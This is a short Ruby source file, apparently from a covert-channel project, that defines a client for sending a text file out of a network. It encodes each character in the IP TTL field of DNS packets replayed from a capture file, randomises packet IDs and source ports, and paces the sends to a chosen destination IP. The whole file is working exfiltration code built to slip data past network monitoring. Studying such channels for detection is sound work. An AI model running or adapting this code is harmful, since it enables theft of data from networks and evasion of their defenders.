require "packetgen"
require "macaddr"
require_relative "constants"

module CovertChannel
  class Client
    PCAP_PATH = File.join(__dir__, "..", "fixtures", "dns.pcap")
    SECRET_MESSAGE_PATH = File.join(__dir__, "..", "fixtures", "secret.txt")

    def initialize(dst_ip:, dst_port: DNS_PORT, path: SECRET_MESSAGE_PATH)
      @dst_ip = dst_ip
      @dst_port = dst_port
      @message = File.read(path)
    end

    def call
      @message.each_char do |char|
        send_packet(char.ord)
        sleep(DELAY)
      end

      send_packet(END_TRANSMISSION_FLAG)
    end

    private

    def send_packet(ttl)
      dns_packets = PacketGen.read(PCAP_PATH)
      base_packet = dns_packets.sample
      base_packet.eth(src: Mac.addr)
      ip_src = Socket.ip_address_list[1].ip_address
      base_packet.ip(id: rand(0..65535), dst: @dst_ip, ttl: ttl + DEFAULT_MIN_TTL, src: ip_src)
      base_packet.udp(dport: @dst_port, sport: rand(49152..65535))
      base_packet.to_w
    end
  end
end



